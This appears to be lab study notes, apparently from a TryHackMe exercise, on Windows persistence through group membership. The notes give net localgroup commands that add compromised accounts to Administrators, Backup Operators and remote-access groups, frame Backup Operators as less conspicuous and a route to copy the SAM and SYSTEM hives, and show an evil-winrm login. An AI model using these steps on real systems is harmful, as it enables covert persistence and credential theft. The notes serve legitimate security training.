### Assign Group Memberships
**We will assume that you have dumped the password hashes and successfully cracked the passwords for the unprivileged accounts in use.**

**Direct way to make an unprivileged user gain administrative privileges is to make it part of the `Administrators group`**
```cmd
net localgroup administrators thmuser0 /add
```

If that looks suspicious, use the `Backup Operators` group. Users in this group won't have administrative privileges, but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This will allows us to copy the content of the `SAM` and `SYSTEM` registry hives.
```cmd
net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it can't RDP or WinRM back to the machine. So, add the user to these groups
```cmd
# RDP
net localgroup "Remote Desktop Users" thmuser1 /add

# WinRM
net localgroup "Remote Management Users" thmuser1 /add
```

#### Evil-WinRM
```
evil-winrm -i <TARGET-IP> -u <USERNAME> -p <PASSWORD>
```

Even if you are connected from your ***attacker machine***, and even if you are on the ***Backup Operators group***, you would ***not be able to access all files remotely because `UAC limits your privileges`***. This happens due to `LocalAccountTokenFilterPolicy`, which ***strips admin rights from local accounts during remote (WinRM) logins***. 